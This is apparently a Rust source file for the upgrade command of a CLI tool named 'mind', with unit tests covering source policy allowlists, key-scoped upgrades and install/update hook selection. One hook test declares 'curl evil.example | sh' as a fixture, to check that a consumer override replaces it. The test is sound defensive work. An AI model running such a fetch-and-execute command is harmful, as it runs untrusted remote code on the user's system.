            .filter(|i| i.source == source.name)
            .collect();
        let Some(moved) = installed.iter().find(|i| i.commit != commit) else {
            continue;
        };
        let from = moved.version.as_deref().unwrap_or("?");
        // A move from outside the range is a breaking release the user took
        // (VER-62, VER-63): expected to break, so only a compatible one is
        // called out. Its drops still earn the `mind prune` hint.
        let compatible = match (vp.parsed_range(), crate::version::Version::parse(from)) {
            (Some(range), Some(v)) => range.matches(&v),
            _ => true,
        };
        let siblings: Vec<&CatalogItem> =
            catalog.iter().filter(|c| c.source == source.name).collect();
        let cases = apparent_break_cases(
            installed
                .iter()
                .filter(|i| !prunes.iter().any(|p| p.key() == i.key()))
                // spec: DSC-123 -- skipped for an unreadable manifest, not dropped.
                .filter(|i| !catalog::dropped_as_unreadable(&i.source, i.kind, &i.bare_name))
                .map(|i| (i.kind, i.bare_name.as_str(), i.display_key())),
            &siblings,
        );
        for case in cases {
            any_drop |= case.starts_with("drops ");
            if !compatible {
                continue;
            }
            let line = format!(
                "{} {from} -> {} looks breaking: {case}",
                strip_ansi(&source.name),
                strip_ansi(to)
            );
            if out.json {
                eprintln!("{} {line}", out.warn());
            } else {
                println!("{} {line}", out.warn());
            }
        }
    }
    // spec: CLI-245 -- a dropped item is never upgraded, so the warning
    // repeats until it is forgotten; point at the one command that does that.
    if any_drop {
        eprintln!("hint: run `mind prune` to remove items a source no longer offers");
    }
}

/// Whether `source`'s checked-out `mind.toml` declares `[source] prune = true`
/// (LIFE-57). An unreadable or invalid file reads as not declaring it.
// spec: LIFE-57
pub(crate) fn declares_prune(paths: &Paths, source: &crate::source::Source) -> bool {
    matches!(MindToml::load(&source.clone_dir(paths)), Ok(Some(t)) if t.source.prune)
}

/// List the items an upgrade pass prunes (LIFE-57).
fn print_prunes(prunes: &[crate::manifest::InstalledItem]) {
    if prunes.is_empty() {
        return;
    }
    let out = crate::render::ctx();
    let n = prunes.len();
    let noun = if n == 1 { "item" } else { "items" };
    println!("{n} {noun} removed upstream, to prune (the source declares `prune`):\n");
    for item in prunes {
        // spec: DSC-95
        println!(
            "  {} {} {}",
            out.warn(),
            item.display_key(),
            out.dim(&format!("[{}]", strip_ansi(&item.source)))
        );
    }
    println!();
}

/// List the profile leftovers an upgrade pass prunes (PROF-39).
fn print_left_prunes(items: &[crate::manifest::InstalledItem]) {
    if items.is_empty() {
        return;
    }
    let out = crate::render::ctx();
    let n = items.len();
    let noun = if n == 1 { "item" } else { "items" };
    println!(
        "{n} {noun} no longer in the enabled profiles, to prune (the source declares `prune`):\n"
    );
    for item in items {
        // spec: DSC-95
        println!(
            "  {} {} {}",
            out.warn(),
            item.display_key(),
            out.dim(&format!("[{}]", strip_ansi(&item.source)))
        );
    }
    println!();
}

/// The VER-65 cases a move from `old` items to the catalog `siblings` shows:
/// an item gone from the catalog, an item whose name now has another kind, and
/// a `{{ns:}}` token in an item's new text whose referent is gone. `old` is
/// `(kind, bare name, display key)`. Shared by `upgrade` (VER-65) and `review`
/// (VER-130).
pub(crate) fn apparent_break_cases<'a>(
    old: impl IntoIterator<Item = (ItemKind, &'a str, String)>,
    siblings: &[&CatalogItem],
) -> Vec<String> {
    let mut cases: Vec<String> = Vec::new();
    for (kind, bare, key) in old {
        let same_name: Vec<&&CatalogItem> = siblings.iter().filter(|c| c.name == bare).collect();
        let Some(cat) = same_name.iter().find(|c| c.kind == kind) else {
            match same_name.first() {
                None => cases.push(format!("drops {key}")),
                Some(c) => cases.push(format!(
                    "changes {} from {} to {}",
                    strip_ansi(bare),
                    kind.as_str(),
                    c.kind.as_str()
                )),
            }
            continue;
        };
        for name in crate::namespace::referenced_names(&read_item_text(cat)) {
            if !siblings.iter().any(|c| c.name == name) {
                cases.push(format!(
                    "removes {} referenced by {key}",
                    strip_ansi(&format!("{{{{ns:{name}}}}}")),
                ));
            }
        }
    }
    cases
}

struct Upgrade {
    pub(super) cat: CatalogItem,
    pub(super) old: crate::manifest::InstalledItem,
    pub(super) new_commit: String,
    new_hash: String,
    new_name: String,
    /// The homes the store copy moves between, when its source moved (HOME-8).
    home_move: Option<(std::path::PathBuf, std::path::PathBuf)>,
    /// Where the item's links move (LOBE-5): the source's own lobe, or `None`
    /// inside for the configured lobes. `None` outside when they stay put.
    pub(super) relink: Option<Option<std::path::PathBuf>>,
}

/// Whether `item`'s links are not where its source's lobe puts them (LOBE-5),
/// and if so where they go: `Some(Some(root))` for the source's lobe,
/// `Some(None)` back to the configured lobes. A linkable item is misplaced
/// when the lobe it recorded at install differs from the one in effect now,
/// or, with a lobe in effect, when it still records a link under the default
/// lobe that is not under that lobe (one an earlier run could not remove).
/// An item from a source that never had a lobe is never misplaced, so where
/// the configured lobes point does not matter here.
// spec: LOBE-5
fn links_misplaced(
    paths: &Paths,
    item: &crate::manifest::InstalledItem,
    cat: &CatalogItem,
) -> Result<Option<Option<std::path::PathBuf>>> {
    use std::path::Path;
    let linkable = cat.link_rel.is_some() || paths.default_link_rel(cat.kind, &cat.name).is_some();
    if !linkable {
        return Ok(None);
    }
    let root = paths.effective_source_lobe(&item.source)?;
    if item.lobe.as_deref().map(Path::new) != root.as_deref() {
        return Ok(Some(root));
    }
    if let Some(root) = root {
        let default = paths.default_lobe_path()?;
        let stale = item
            .links
            .iter()
            .map(Path::new)
            .any(|l| l.starts_with(&default) && !l.starts_with(&root));
        if stale {
            return Ok(Some(Some(root)));
        }
    }
    Ok(None)
}

fn print_upgrade_report(
    paths: &Paths,
    registry: &Registry,
    pending: &[Upgrade],
    tracking: &ProfileTracking,
) {
    let out = crate::render::ctx();
    // spec: PROF-21 -- additions are listed with the profile they joined.
    print_profile_additions(tracking);
    let n = pending.len();
    if n == 0 {
        return;
    }
    let (noun, verb) = if n == 1 {
        ("item", "has")
    } else {
        ("items", "have")
    };
    // spec: HOME-8 LOBE-5 -- a batch of home moves and relinks alone is not
    // an upstream change: it is headed "to move" when any item changes home,
    // else "to relink".
    let unchanged = pending.iter().all(|up| {
        (up.home_move.is_some() || up.relink.is_some())
            && up.new_hash == up.old.hash
            && up.new_name == up.old.name
    });
    if unchanged && pending.iter().any(|up| up.home_move.is_some()) {
        println!("{n} {noun} to move:\n");
    } else if unchanged {
        println!("{n} {noun} to relink:\n");
    } else {
        println!("{n} {noun} {verb} upstream changes:\n");
    }
    for up in pending {
        // spec: DSC-95 -- sanitize every source-controlled field before
        // composing the line (not the composed line after): this report
        // prints right before a default-yes confirmation, so an unterminated
        // escape in one field must not be able to consume a later one and
        // read as "nothing to do".
        let cat_name = crate::sanitize::strip_ansi(&up.cat.name);
        let cat_source = crate::sanitize::strip_ansi(&up.cat.source);
        let old_name = crate::sanitize::strip_ansi(&up.old.name);
        let new_name = crate::sanitize::strip_ansi(&up.new_name);
        if up.new_name != up.old.name {
            println!(
                "  {} {} {} {}  rename {} -> {}",
                out.warn(),
                up.cat.kind,
                cat_name,
                out.dim(&format!("[{cat_source}]")),
                old_name,
                out.green(&new_name)
            );
        } else {
            println!(
                "  {} {} {}",
                out.warn(),
                up.cat.display_key(),
                out.dim(&format!("[{cat_source}]"))
            );
        }
        println!(
            "    {}    {} -> {}",
            out.dim("hash"),
            short(&up.old.hash),
            short(&up.new_hash)
        );
        println!(
            "    {}  {} -> {}",
            out.dim("commit"),
            short(&up.old.commit),
            short(&up.new_commit)
        );
        if let Some((from, to)) = &up.home_move {
            println!(
                "    {}    {} -> {}",
                out.dim("home"),
                crate::sanitize::display_path(from),
                crate::sanitize::display_path(to)
            );
        }
        // spec: LOBE-5 LOBE-8
        if let Some(to) = &up.relink {
            let to = match to {
                Some(root) if paths.lobe_outside_homes(root) => out.bold(&format!(
                    "{}, a directory outside every mind home",
                    crate::sanitize::display_path(root)
                )),
                Some(root) => crate::sanitize::display_path(root),
                None => "the configured lobes".to_string(),
            };
            println!("    {}    -> {to}", out.dim("lobe"));
        }
        // spec: VER-60 -- a version-pinned source shows the release delta too.
        if let Some(src) = registry.find(&up.cat.source)
            && let Pin::Version(vp) = &src.pin
            && src.commit.as_deref() == Some(up.new_commit.as_str())
            && let Some(to) = &vp.resolved
        {
            println!(
                "    {} {} -> {}",
                out.dim("version"),
                up.old.version.as_deref().unwrap_or("?"),
                to
            );
        }
        if let Some(src) = registry.find(&up.cat.source)
            && !up.old.commit.is_empty()
            && !up.new_commit.is_empty()
            && let Some(url) = src.compare_url(&up.old.commit, &up.new_commit)
        {
            println!("    {}    {url}", out.dim("diff"));
        }
        println!();
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::commands::test_support::*;

    /// A registry holding exactly the given repo specs, so
    /// `upgrade_item_disposition` can resolve a recorded source name to its
    /// structural base identity (POL-68) the way it does in production.
    fn registry_of(specs: &[&str]) -> Registry {
        Registry {
            sources: specs
                .iter()
                .map(|s| crate::source::parse_spec(s).unwrap())
                .collect(),
        }
    }

    // spec: POL-12
    // A scoped `upgrade <item>` must apply the item-ref filter before the policy
    // skip, so an out-of-scope item from a disallowed source produces no skip
    // line. The pre-fix ordering (policy skip first) would classify it as
    // PolicyBlocked and print a skip line for a source the user never selected.
    #[test]
    fn pol12_scoped_upgrade_no_skip_for_out_of_scope_source() {
        // Locked allowlist that permits only `allowed-src`.
        let policy_toml = concat!(
            "[sources]\n",
            "lock = true\n",
            "allow = [\"github.com/me/allowed-src\"]\n",
        );
        let (_guard, base) = with_policy(policy_toml);
        let policy = Paths::new(base.clone(), base.join("claude"))
            .settings()
            .policy()
            .unwrap()
            .expect("policy should load");
        assert!(policy.lock());

        // The user scopes to an item from the allowed source.
        let selected = item("wanted", "github.com/me/allowed-src");
        // An installed item from a *disallowed* source the user did NOT select.
        let other = item("unwanted", "github.com/them/blocked-src");

        let filter = parse_item_ref("wanted").unwrap();
        let registry = registry_of(&["me/allowed-src", "them/blocked-src"]);

        // Out-of-scope item: silently skipped, never reported as PolicyBlocked.
        assert_eq!(
            upgrade_item_disposition(&other, Some(&filter), None, None, Some(&policy), &registry),
            UpgradeDisposition::OutOfScope,
            "POL-12: an unselected item must not be policy-skipped (no skip line)"
        );
        // The selected, allowed item is considered for upgrade.
        assert_eq!(
            upgrade_item_disposition(
                &selected,
                Some(&filter),
                None,
                None,
                Some(&policy),
                &registry
            ),
            UpgradeDisposition::Consider,
        );

        // Sanity: with no scope filter, the disallowed item IS policy-blocked
        // (the existing unscoped behavior is preserved).
        assert_eq!(
            upgrade_item_disposition(&other, None, None, None, Some(&policy), &registry),
            UpgradeDisposition::PolicyBlocked,
        );

        let _ = std::fs::remove_dir_all(&base);
    }

    // POL-68: an installed item records its source as an *instance* identity,
    // which may carry an item-link `#path` and/or `@alias` suffix. The
    // disposition check must resolve that name through the registry to the
    // structural base identity, so a locked policy that admitted the repo keeps
    // admitting its instances, while an unregistered name fails closed.
    // spec: POL-68
    #[test]
    fn upgrade_disposition_resolves_instance_names_to_base_identity() {
        let policy_toml = concat!(
            "[sources]\n",
            "lock = true\n",
            "allow = [\"github.com/me/allowed-src\"]\n",
        );
        let (_guard, base) = with_policy(policy_toml);
        let policy = Paths::new(base.clone(), base.join("claude"))
            .settings()
            .policy()
            .unwrap()
            .expect("policy should load");

        // A link instance and an aliased instance of the allowed repo, both
        // registered under their extended identities.
        let mut registry = Registry::default();
        let link =
            crate::source::parse_spec("https://github.com/me/allowed-src/tree/main/skills/foo")
                .unwrap();
        assert_eq!(link.name, "github.com/me/allowed-src#skills/foo");
        let mut aliased = crate::source::parse_spec("me/allowed-src").unwrap();
        aliased.apply_alias(Some("fork".into()));
        assert_eq!(aliased.name, "github.com/me/allowed-src@fork");
        let link_name = link.name.clone();
        let aliased_name = aliased.name.clone();
        registry.sources.push(link);
        registry.sources.push(aliased);

        for name in [&link_name, &aliased_name] {
            assert_eq!(
                upgrade_item_disposition(
                    &item("foo", name),
                    None,
                    None,
                    None,
                    Some(&policy),
                    &registry
                ),
                UpgradeDisposition::Consider,
                "{name}: an instance of an allowed repo stays allowed"
            );
        }

        // An item whose source is not registered has no structural base
        // identity to recover, so it is refused rather than guessed at. It is
        // reported as SourceNotRegistered (POL-69), not PolicyBlocked: the
        // source simply is not melded any more, which is a different fact
        // than "outside the allowlist".
        assert_eq!(
            upgrade_item_disposition(
                &item("foo", "github.com/me/allowed-src#skills/foo"),
                None,
                None,
                None,
                Some(&policy),
                &Registry::default()
            ),
            UpgradeDisposition::SourceNotRegistered,
            "an unregistered instance name fails closed, distinctly from a policy block"
        );

        let _ = std::fs::remove_dir_all(&base);
    }

    // spec: POL-69
    // A recorded source name that resolves to NO registered source (e.g. the
    // source was unmelded after the item was installed) must be reported
    // distinctly from PolicyBlocked: the fail-closed refusal still applies
    // (POL-68), but the reason is that the source is not registered, not that
    // a registered source's identity fell outside the allowlist.
    #[test]
    fn upgrade_disposition_distinguishes_unregistered_source_from_policy_block() {
        let policy_toml = concat!(
            "[sources]\n",
            "lock = true\n",
            "allow = [\"github.com/me/allowed-src\"]\n",
        );
        let (_guard, base) = with_policy(policy_toml);
        let policy = Paths::new(base.clone(), base.join("claude"))
            .settings()
            .policy()
            .unwrap()
            .expect("policy should load");

        // A registered, but disallowed, source: PolicyBlocked.
        let registry = registry_of(&["me/allowed-src", "them/blocked-src"]);
        assert_eq!(
            upgrade_item_disposition(
                &item("foo", "github.com/them/blocked-src"),
                None,
                None,
                None,
                Some(&policy),
                &registry,
            ),
            UpgradeDisposition::PolicyBlocked,
            "a registered source outside the allowlist is PolicyBlocked"
        );

        // A source name with NO registered source at all (unmelded, or never
        // melded under that name): SourceNotRegistered, not PolicyBlocked,
        // even though both still refuse the upgrade.
        assert_eq!(
            upgrade_item_disposition(
                &item("foo", "github.com/gone/unmelded-src"),
                None,
                None,
                None,
                Some(&policy),
                &registry,
            ),
            UpgradeDisposition::SourceNotRegistered,
            "an item whose source is not registered must not be reported as PolicyBlocked"
        );

        let _ = std::fs::remove_dir_all(&base);
    }

    // spec: POL-12
    // When the scoped item itself comes from a disallowed source, it passes the
    // filter and is then correctly reported as PolicyBlocked (the skip is for an
    // item the user actually selected, which is the intended behavior).
    #[test]
    fn pol12_scoped_upgrade_skips_selected_disallowed_item() {
        let policy_toml = concat!(
            "[sources]\n",
            "lock = true\n",
            "allow = [\"github.com/me/allowed-src\"]\n",
        );
        let (_guard, base) = with_policy(policy_toml);
        let policy = Paths::new(base.clone(), base.join("claude"))
            .settings()
            .policy()
            .unwrap()
            .expect("policy should load");

        let selected = item("blocked-item", "github.com/them/blocked-src");
        let filter = parse_item_ref("blocked-item").unwrap();
        let registry = registry_of(&["me/allowed-src", "them/blocked-src"]);

        assert_eq!(
            upgrade_item_disposition(
                &selected,
                Some(&filter),
                None,
                None,
                Some(&policy),
                &registry
            ),
            UpgradeDisposition::PolicyBlocked,
            "a selected item from a disallowed source is still reported"
        );

        let _ = std::fs::remove_dir_all(&base);
    }

    // spec: TUI-72 TUI-73
    #[test]
    fn a_key_scoped_upgrade_skips_inapplicable_confirmed_keys_without_aborting() {
        // The TUI's confirm-to-apply window is real: by the time the
        // key-scoped pass runs, a confirmed key may no longer be
        // applicable -- its drift already resolved, or the item never existed
        // at all (forgotten, or a stale reference). Neither case may abort the
        // batch; each confirmed key is considered independently and an
        // inapplicable one is silently dropped, exactly like an out-of-scope
        // item already is for a glob-filtered `upgrade <item>`.
        use std::process::Command;

        let n = COUNTER.fetch_add(1, Ordering::SeqCst);
        let base = std::env::temp_dir().join(format!(
            "mind-cmd-upgrade-keys-skip-{}-{n}",
            std::process::id()
        ));
        let _ = std::fs::remove_dir_all(&base);
        let paths = Paths::new(base.join("mind"), base.join("claude"));
        crate::paths::mkdir_p(&paths.mind_home).unwrap();
        crate::config::Config {
            lobes: vec![crate::config::LobeEntry::bare(
                paths.claude_home.to_str().unwrap(),
            )],
            ..Default::default()
        }
        .save(&paths)
        .unwrap();

        let src = base.join("skip-source");
        std::fs::create_dir_all(src.join("skills/applies")).unwrap();
        std::fs::write(
            src.join("skills/applies/SKILL.md"),
            "---\ndescription: applies skill\n---\n# applies\noriginal\n",
        )
        .unwrap();
        std::fs::create_dir_all(src.join("skills/resolved")).unwrap();
        let resolved_original = "---\ndescription: resolved skill\n---\n# resolved\noriginal\n";
        std::fs::write(src.join("skills/resolved/SKILL.md"), resolved_original).unwrap();
        let run = |args: &[&str]| {
            Command::new("git")
                .args(args)
                .current_dir(&src)
                .output()
                .expect("git");
        };
        run(&["-c", "init.defaultBranch=main", "init", "-q"]);
        run(&["config", "user.email", "t@t"]);
        run(&["config", "user.name", "t"]);
        run(&["add", "-A"]);
        run(&["commit", "-qm", "initial"]);

        meld(
            &paths,
            src.to_str().unwrap(),
            None,
            vec![],
            vec![],
            false,
            PinRequest::None,
            None,
            crate::hook::Accept::default(),
            None,
        )
        .expect("meld");
        for item_key in ["skill:applies", "skill:resolved"] {
            learn(
                &paths,
                item_key,
                false,
                InstallFlow {
                    yes: true,
                    clobber: Clobber::Force,
                    accept: crate::hook::Accept::ALL,
                },
            )
            .expect("learn");
        }

        let manifest_before = crate::manifest::Manifest::load(&paths).unwrap();
        let applies_hash_before = manifest_before
            .items
            .get("skill:applies")
            .unwrap()
            .hash
            .clone();
        let resolved_hash_before = manifest_before
            .items
            .get("skill:resolved")
            .unwrap()
            .hash
            .clone();

        // `skill:applies` drifts for real and stays drifted -- this is the
        // confirmed key that must actually apply.
        std::fs::write(
            src.join("skills/applies/SKILL.md"),
            "---\ndescription: applies skill\n---\n# applies\nedited\n",
        )
        .unwrap();
        // spec: TUI-72 TUI-73 -- L12: `skill:resolved` also drifts for real and
        // STAYS drifted (unlike the old version of this test, which reverted it
        // back to `resolved_original` before the apply ran -- with the content
        // unchanged, `resolved_hash_after == resolved_hash_before` could never
        // fail regardless of whether `key_scope` worked, since the item was
        // never in `pending` at all to begin with). `skill:resolved` is
        // deliberately left OUT of `confirmed_keys` below, so this is now a
        // real exercise of `key_scope`: an item that genuinely IS pending but
        // was never confirmed must come out of the apply untouched.
        std::fs::write(
            src.join("skills/resolved/SKILL.md"),
            "---\ndescription: resolved skill\n---\n# resolved\nedited\n",
        )
        .unwrap();

        // The confirmed set also names a key that was never installed at all
        // (e.g. forgotten between confirm and apply, or a stale reference).
        // `skill:resolved` is NOT in this set, even though it is genuinely
        // out of date (see above).
        let confirmed_keys = vec!["skill:applies".to_string(), "skill:ghost".to_string()];

        let result = upgrade(
            &paths,
            UpgradeOpts {
                no_sync: true,
                keys: Some(&confirmed_keys),
                ..UpgradeOpts::new(true, crate::hook::Accept::default())
            },
        );
        assert!(
            result.is_ok(),
            "a partially-inapplicable confirmed set must not abort the run: {:?}",
            result.err()
        );

        let manifest_after = crate::manifest::Manifest::load(&paths).unwrap();
        let applies_hash_after = manifest_after
            .items
            .get("skill:applies")
            .unwrap()
            .hash
            .clone();
        let resolved_hash_after = manifest_after
            .items
            .get("skill:resolved")
            .unwrap()
            .hash
            .clone();

        assert_ne!(
            applies_hash_after, applies_hash_before,
            "the still-applicable confirmed key must still be upgraded"
        );
        assert_eq!(
            resolved_hash_after, resolved_hash_before,
            "a genuinely pending item that was never in the confirmed key set \
             must be left untouched by `key_scope` -- unlike `skill:applies`, \
             its content really did drift, so this only holds if `key_scope` \
             actually excluded it"
        );
        // No panic and no error for `skill:ghost`, which was never installed:
        // reaching this point at all is the assertion.

        let _ = std::fs::remove_dir_all(&base);
    }

    /// A declared install hook, for the selector tests.
    fn declared_install(run: &str) -> crate::mindfile::ResolvedHook {
        crate::mindfile::ResolvedHook {
            run: run.to_string(),
            name: None,
            optional: false,
            event: HookEvent::Install,
        }
    }

    /// Whether `upgrade` would offer any hook for this source, when the source
    /// still declares every recorded command as an install hook and declares no
    /// update hook (the install-hook path, HOOK-122). The `pending_update_hooks`
    /// selector replaced the old `hook_rerun_warranted` predicate; this keeps
    /// the truth table it covered.
    fn hook_rerun_warranted(source: &crate::source::Source) -> bool {
        let declared: Vec<crate::mindfile::ResolvedHook> = source
            .install_hooks
            .iter()
            .map(|r| declared_install(&r.command))
            .collect();
        !select_upgrade_hooks(source, &declared, true)
            .hooks
            .is_empty()
    }

    /// A recorded install hook the source's clone no longer declares must not be
    /// re-offered: the disclosure would say `Event: install` for a command no
    /// site declares, and a `--accept-hooks` run would
    /// execute it unattended at a commit the author controls.
    // spec: HOOK-55
    #[test]
    fn a_withdrawn_install_hook_is_not_replayed_from_the_record() {
        let source = hook_source(Some("new0000"), &[("make install", Some("old0000"))]);
        assert!(
            select_upgrade_hooks(&source, &[], true).hooks.is_empty(),
            "a record with no matching declaration is not offered"
        );
        assert!(
            !select_upgrade_hooks(&source, &[declared_install("make install")], true)
                .hooks
                .is_empty(),
            "the same record IS offered while the source still declares it"
        );
    }

    /// The install-hook fallback takes the author's `name` and `optional` flag
    /// from the declaration, not from the record (which carries neither for a
    /// declared hook). Disclosing an optional hook as required, under its raw
    /// command instead of its name, misstates the two things the consent prompt
    /// is for.
    // spec: HOOK-51 HOOK-52
    #[test]
    fn a_pending_install_hook_is_disclosed_with_its_declared_name_and_optional_flag() {
        let source = hook_source(Some("new0000"), &[("make setup", Some("old0000"))]);
        let declared = vec![crate::mindfile::ResolvedHook {
            run: "make setup".to_string(),
            name: Some("Build the tooling".to_string()),
            optional: true,
            event: HookEvent::Install,
        }];
        let pending = select_upgrade_hooks(&source, &declared, true);
        assert_eq!(pending.event, "install");
        assert_eq!(pending.hooks.len(), 1);
        assert_eq!(pending.hooks[0].label, "Build the tooling");
        assert!(
            pending.hooks[0].optional,
            "an optional hook must not be disclosed as required"
        );
    }

    /// A consumer `meld --install-hook` override covers the update event too: a
    /// source that moves its command to `event = "update"` must not slip the
    /// author's command past a consumer who replaced it (HOOK-56).
    // spec: HOOK-56 HOOK-122
    #[test]
    fn a_recorded_override_replaces_the_sources_update_hooks() {
        let mut source = hook_source(Some("new0000"), &[]);
        let mut overridden = crate::source::RecordedSourceHook::install("./mine.sh", None);
        overridden.origin = Some(HookOrigin::Override);
        source.install_hooks.push(overridden);
        let declared = vec![crate::mindfile::ResolvedHook {
            run: "curl evil.example | sh".to_string(),
            name: None,
            optional: false,
            event: HookEvent::Update,
        }];

        let pending = select_upgrade_hooks(&source, &declared, true);
        assert_eq!(pending.event, "update");
        assert_eq!(pending.hooks.len(), 1);
        assert_eq!(
            pending.hooks[0].run, "./mine.sh",
            "the consumer's command is what runs"
        );
        assert_eq!(
            pending.hooks[0].declared_override().as_deref(),
            Some("curl evil.example | sh"),
            "the disclosure still names the declared command it replaced"
        );
    }

    /// A curated `[[discover.sources.hooks]]` update entry (DSC-61) lives in the
    /// PARENT's manifest, so it is offered from the record. It stops applying
    /// once the nested source ships a `mind.toml` of its own (DSC-60).
    // spec: HOOK-127
    #[test]
    fn a_curated_update_hook_is_offered_from_the_record_and_gated_by_dsc_60() {
        let mut source = hook_source(Some("new0000"), &[]);
        let mut curated = crate::source::RecordedSourceHook::install("./migrate.sh", None);
        curated.event = Some(RecordedEvent::Update);
        curated.origin = Some(HookOrigin::Curated);
        curated.name = Some("Migrate".to_string());
        curated.optional = true;
        source.install_hooks.push(curated);

        let pending = select_upgrade_hooks(&source, &[], false);
        assert_eq!(pending.event, "update");
        assert_eq!(pending.hooks.len(), 1);
        assert_eq!(pending.hooks[0].run, "./migrate.sh");
        assert_eq!(pending.hooks[0].label, "Migrate");
        assert!(pending.hooks[0].optional);

        let gated = select_upgrade_hooks(&source, &[], true);
        assert_eq!(
            gated.event, "install",
            "a nested source with its own mind.toml drops the curated hooks"
        );
        assert!(gated.hooks.is_empty());
    }

    // spec: HOOK-11 HOOK-55
    #[test]
    fn hook_rerun_warranted_truth_table() {
        // No hooks recorded: never re-run.
        assert!(
            !hook_rerun_warranted(&hook_source(Some("abc1234"), &[])),
            "no install_hooks means no re-run"
        );

        // Hook already ran at the current commit: nothing to do.
        assert!(
            !hook_rerun_warranted(&hook_source(
                Some("abc1234"),
                &[("make install", Some("abc1234"))],
            )),
            "ran_at == commit means the hook already ran here"
        );

        // All hooks ran at current commit: nothing to do.
        assert!(
            !hook_rerun_warranted(&hook_source(
                Some("abc1234"),
                &[
                    ("make build", Some("abc1234")),
                    ("make install", Some("abc1234")),
                ],
            )),
            "all hooks ran at current commit means no re-run warranted"
        );

        // Hook recorded but never run (skipped meld): re-offer it.
        assert!(
            hook_rerun_warranted(&hook_source(Some("abc1234"), &[("make install", None)],)),
            "a recorded-but-never-run hook is re-offered"
        );

        // Commit advanced past the commit the hook last ran at: re-offer it.
        assert!(
            hook_rerun_warranted(&hook_source(
                Some("def5678"),
                &[("make install", Some("abc1234"))],
            )),
            "an advanced commit warrants a re-run"
        );

        // Mixed: one hook ran at current commit, one at a stale commit.
        assert!(
            hook_rerun_warranted(&hook_source(
                Some("new0000"),
                &[
                    ("make build", Some("new0000")),
                    ("make install", Some("old0000")),
                ],
            )),
            "at least one stale hook warrants a re-run"
        );
    }

    // spec: HOOK-50 HOOK-55
    // Verifies that `hook_rerun_warranted` uses the new multi-hook model: a source
    // with multiple install hooks is re-offered when ANY hook is pending, and not
    // re-offered when ALL hooks have ran_at == commit.
    #[test]
    fn hook_rerun_warranted_multi_hook_model() {
        // All hooks ran at the current commit: not warranted.
        let all_current = hook_source(
            Some("fff000"),
            &[
                ("make build", Some("fff000")),
                ("make install", Some("fff000")),
                ("make test", Some("fff000")),
            ],
        );
        assert!(
            !hook_rerun_warranted(&all_current),
            "all hooks current => no re-run warranted"
        );

        // One hook never ran (ran_at == None): warranted.
        let one_never_ran = hook_source(
            Some("fff000"),
            &[
                ("make build", Some("fff000")),
                ("make install", None), // skipped at meld time
            ],
        );
        assert!(
            hook_rerun_warranted(&one_never_ran),
            "one hook with ran_at=None => re-run warranted"
        );

        // Source has no commit yet (None): all pending (ran_at=None matches None but
        // hooks with a ran_at=Some differ from None).
        let no_commit = hook_source(None, &[("make install", Some("old"))]);
        assert!(
            hook_rerun_warranted(&no_commit),
            "commit=None and ran_at=Some => they differ => warranted"
        );
    }

    // ---- absorb helper unit tests ----
}
